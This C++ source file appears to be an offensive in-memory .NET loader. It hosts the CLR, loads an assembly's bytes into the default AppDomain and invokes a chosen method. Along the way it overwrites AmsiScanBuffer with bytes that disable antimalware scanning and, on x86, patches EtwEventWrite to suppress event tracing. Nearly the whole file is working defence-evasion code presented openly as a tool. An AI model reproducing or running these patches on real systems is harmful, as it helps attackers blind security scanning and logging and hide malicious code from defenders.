#include <metahost.h>
#include <comutil.h>
#include <Psapi.h>
#include <tchar.h>
#include <fstream>
#include <iostream>
#include <vector>

#pragma comment(lib, "mscoree.lib")

// Import mscorlib.tlb (Microsoft Common Language Runtime Class Library).
#import <mscorlib.tlb> raw_interfaces_only			\
    	high_property_prefixes("_get","_put","_putref")		\
    	rename("ReportEvent", "InteropServices_ReportEvent")	\
	rename("or", "InteropServices_or")
using namespace mscorlib;
#pragma endregion

void CheckIfAmsiIsLoaded() {
	printf("\n");
	if (GetModuleHandle(L"amsi.dll")) {
		printf("[x] AMSI.DLL Found!\n");
	}
	else {
		printf("[x] AMSI.DLL not Found!\n");
	}
	printf("\n");
}

std::pair<PVOID, DWORD> GetShellcodeFromFile(LPCSTR Filename) {
	HANDLE hFile = CreateFileA(Filename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, 0, NULL); // Open the DLL
	DWORD FileSize = GetFileSize(hFile, NULL);
	PVOID FileBuffer = VirtualAlloc(NULL, FileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	// Read the DLL
	ReadFile(hFile, FileBuffer, FileSize, NULL, NULL);
	return std::pair<PVOID, DWORD>(FileBuffer, FileSize);
}

BOOL is64bit() {
	if (sizeof(void*) == 8) {
		return true;
	}
	else {
		return false;
	}
}

int PatchAMSI(unsigned char Patch[])
{
	printf("\n");
	if (!GetModuleHandle(L"amsi.dll")) {
		if (LoadLibrary(L"amsi.dll")) {
			printf("[+] AMSI.DLL sucessfully loaded!\n");
		}
		else {
			printf("[!] Loading AMSI.DLL failed, skipping AMSI patch...\n");
			return 2;
		}
	}
	printf("[*] Patching AMSI...\n");
	void* AmsiScanBuffer = GetProcAddress(LoadLibrary(L"AMSI.DLL"), "AmsiScanBuffer");
	if (AmsiScanBuffer != NULL) {
		printf("[+] AmsiScanBuffer Address: %p\n", (void*)AmsiScanBuffer);
		DWORD oldProt, oldOldProt;
		VirtualProtect(AmsiScanBuffer, sizeof Patch, PAGE_EXECUTE_READWRITE, &oldProt);
		if (memcpy(AmsiScanBuffer, Patch, sizeof Patch)) {
			printf("[+] AmsiScanBuffer patch copied!\n\n");
			VirtualProtect(AmsiScanBuffer, 4, oldProt, &oldOldProt);
			return 1;
		}
		else {
			printf("[!] Failed copying the patch to AmsiScanBuffer!\n");
			return 2;
		}
	}
	else {
		return 2;
	}
}

int PatchETW()
{
	printf("\n[*] Patching ETW...\n");
	DWORD oldProt, oldOldProt;

	// Get the EventWrite function
	void* eventWrite = GetProcAddress(LoadLibraryA("ntdll"), "EtwEventWrite");
	if (eventWrite != NULL) {
		printf("[+] EtwEventWrite Address: %p\n", (void*)eventWrite);
		// Allow writing to page
		VirtualProtect(eventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProt);
		// Patch with "ret 14" on x86
		if (memcpy(eventWrite, "\xc2\x14\x00\x00", 4)) {
			printf("[+] EtwEventWrite patch copied!\n\n");
			// Return memory to original protection
			VirtualProtect(eventWrite, 4, oldProt, &oldOldProt);
			return 1;
		}
		else {
			printf("[!] Failed copying the patch to EtwEventWrite!\n");
			return 2;
		}
	}
	else {
		printf("[!] Failed to get address of EtwEventWrite");
		return 2;
	}
}

int Execute(LPCSTR Filename, LPCSTR NamespacedotClass, LPCSTR FunctionName, LPCWSTR runtimeVersion) {
	// .\InMemoryNET.exe ..\..\ConsoleApp1\ConsoleApp1\bin\Debug\ConsoleApp1.exe ConsoleApp1.Program EntryPoint

	printf("[*] Executing File: %s\n", Filename);

	unsigned char Patch64[] = "\xb8\x57\x00\x07\x80\xc3";
	unsigned char Patch86[] = "\xb8\x57\x00\x07\x80\xC2\x18\x00";

	printf("\n");

	if (is64bit()) {
		printf("[*] Architecture: x64\n");
	}
	else {
		printf("[*] Architecture: x86\n");
		PatchETW();
	}

	std::pair<PVOID, DWORD> shellcodePair = GetShellcodeFromFile(Filename);
	PVOID shellcodeBytes = shellcodePair.first;
	DWORD shellcodeBytesLength = shellcodePair.second;

	_bstr_t bstrNamespaceDotClass = _bstr_t(NamespacedotClass);
	_bstr_t bstrFunctionName = _bstr_t(FunctionName);

	ICLRRuntimeInfo* pCLRRuntimeInfo = NULL;
	ICorRuntimeHost* pCorRuntimeHost = NULL;
	ICLRMetaHost* pCLRMetaHost = NULL;

	DWORD hr;

	if (CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pCLRMetaHost)) != S_OK)
	{
		printf("[!] CLRCreatenInstance()\n");
		return 2;
	}
	else {
		printf("[+] Created Instance!\n");
	}

	if (pCLRMetaHost->GetRuntime(runtimeVersion, IID_PPV_ARGS(&pCLRRuntimeInfo)) != S_OK)
	{
		printf("[!] ICLRMetaHost->GetRuntime()\n");
		return 2;
	}
	else {
		printf("[+] Using Runtime: %S\n", runtimeVersion);
	}

	BOOL isLoadable;
	if (pCLRRuntimeInfo->IsLoadable(&isLoadable) != S_OK)
	{
		printf("[!] ICLRMetaHost->IsLoadable()\n");
		return 2;
	}
	else {
		printf("[+] isLoadable!\n");
	}

	if (pCLRRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_PPV_ARGS(&pCorRuntimeHost)) != S_OK)
	{
		printf("[!] ICLRRuntimeInfo->GetInterface()\n");
		return 2;
	}

	if (pCorRuntimeHost->Start() != S_OK)
	{
		printf("[!] ICorRuntimeHost.Start()\n");
		return 2;
	}

	printf("[+] Started ICorRuntimeHost()\n");

	IUnknownPtr spAppDomainThunk = NULL;
	_AppDomainPtr spDefaultAppDomain = NULL;

	// Get a pointer to the default AppDomain in the CLR.
	if (pCorRuntimeHost->GetDefaultDomain(&spAppDomainThunk) != S_OK)
	{
		printf("[!] ICorRuntimeHost->GetDefaultDomain()\n");
		return 2;
	}
	else {
		printf("[+] Got DefaultAppDomain: %p\n", (void*)spAppDomainThunk);
	}

	if (spAppDomainThunk->QueryInterface(IID_PPV_ARGS(&spDefaultAppDomain)) != S_OK)
	{
		printf("[!] IUnknownPtr->QueryInterface()\n");
		return 2;
	}

	SAFEARRAYBOUND safeArrayBounds[1];
	safeArrayBounds[0].cElements = shellcodeBytesLength;
	safeArrayBounds[0].lLbound = 0;

	SAFEARRAY* safeArray = SafeArrayCreate(VT_UI1, 1, safeArrayBounds);
	SafeArrayLock(safeArray);
	if (!memcpy(safeArray->pvData, shellcodeBytes, shellcodeBytesLength)) {
		printf("[!] Failed to copy shellcode into safeArray!\n");
		return 2;
	}
	else {
		printf("[+] Bytes copied to: %p\n", (void*)safeArray->pvData);
	}

	SafeArrayUnlock(safeArray);

	_AssemblyPtr spAssembly = NULL;
	// https://docs.microsoft.com/en-us/dotnet/api/system.appdomain.load?view=netcore-3.1#System_AppDomain_Load_System_String_
	// Overload 3
	if (spDefaultAppDomain->Load_3(safeArray, &spAssembly) != S_OK) {
		printf("[!] _AppDomainPtr->Load_3()\n");
		return 2;
	}
	else {
		printf("[+] _AppDomainPtr->Load3() was successful\n");
	}

	/*
		After loading the assembly into the default app domain, amsi is also loaded. Originally, I was patching it here.
		Also, you can just unload it which is funny:
	*/

	if (is64bit()) {
		PatchAMSI(Patch64);
	}
	else {
		PatchAMSI(Patch86);
	}

	/*
	printf("\n");
	if (GetModuleHandle(L"amsi.dll")) {
		printf("[+] AMSI.DLL is currently loaded...\n");
		if (FreeLibrary(GetModuleHandle(L"amsi.dll"))) {
			printf("[+] Successfully unloaded AMSI.DLL\n");
		}
		else {
			printf("[!] Failed to unload AMSI.DLL\n");
		}
	}
	printf("\n");
	*/

	_TypePtr spType = NULL;

	if (spAssembly->GetType_2(bstrNamespaceDotClass, &spType) != S_OK)
	{
		printf("[!] _AssemblyPtr.GetType_2()\n");
		return 2;
	}

	SAFEARRAY* psaStaticMethodArgs = NULL;
	variant_t vtStringArg(L"");
	variant_t vtPSEntryPointReturnVal;
	variant_t vtEmpty;

	psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
	LONG index = 0;

	if (SafeArrayPutElement(psaStaticMethodArgs, &index, &vtStringArg) != S_OK) {
		printf("[!] SafeArrayPutElement()\n");
		return 2;
	}

	printf("[*] Executing %s.%s()\n", NamespacedotClass, FunctionName);
	printf("\n====================================\n");

	// Invoke the method from the Type interface.
	if (spType->InvokeMember_3(
		bstrFunctionName,
		static_cast<BindingFlags>(BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public),
		NULL,
		vtEmpty,
		psaStaticMethodArgs,
		&vtPSEntryPointReturnVal) != S_OK)
	{
		printf("[!] _TypePtr.InvokeMember_3()\n");
		return 2;
	}

	printf("====================================\n\n");
	printf("[+] Successfully Invoked .NET!\n");
	SafeArrayDestroy(psaStaticMethodArgs);
	psaStaticMethodArgs = NULL;
	return 0;
}

int main(int argc, char** argv)
{
	/* Arguments:
	if (argc < 4)
	{
		printf("[!] .\\InMemoryNet.exe <PathToExe> <Namespace.Class> <Method>\n");
		return 2;
	}
	LPCSTR Filename = argv[1];
	LPCSTR NamespacedotClass = argv[2];
	LPCSTR FunctionName = argv[3];
	*/

	LPCSTR Filename = "C:\\Users\\Desktop\\mez0\\InMemoryNET\\ConsoleApp1\\ConsoleApp1\\bin\\Debug\\ConsoleApp1.exe";
	LPCSTR NamespacedotClass = "ConsoleApp1.Program";
	LPCSTR FunctionName = "EntryPoint";
	LPCWSTR runtimeVersion = L"v4.0.30319";
	
	Execute(Filename, NamespacedotClass, FunctionName, runtimeVersion);
}